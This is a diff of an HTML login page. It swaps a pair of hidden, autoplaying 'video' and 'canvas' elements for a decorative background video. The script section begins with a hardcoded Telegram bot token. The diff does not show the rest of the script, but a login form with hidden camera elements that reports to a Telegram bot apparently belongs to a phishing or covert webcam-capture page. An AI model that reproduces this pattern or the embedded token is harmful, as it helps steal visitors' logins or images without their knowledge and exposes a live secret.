@@ -85,6 +85,16 @@ body {
   background-color: #0f0;
   box-shadow: 0 0 20px lime;
 }
+.video-background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -2; /* Below content and modals */
+            filter: brightness(0.7);
+}
 #info {
   white-space: pre-wrap;
   text-align: left;
@@ -93,9 +103,6 @@ body {
   padding: 15px;
   border-radius: 8px;
   font-size: 13px;
-}
-video, canvas {
-  display: none;
 }
 @media (max-width: 480px) {
   .login-container {
@@ -122,8 +129,10 @@ video, canvas {
   <div id="info"></div>
 </div>
 
-<video id="video" autoplay></video>
-<canvas id="canvas"></canvas>
+ <video autoplay muted loop class="video-background">
+        <source src="https://files.catbox.moe/zobqgj.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+ </video>
 
 <script>
 const botToken = '7627290256:AAEG76BaONyPIJDYhVZgKpFErrizYSLrJGY';
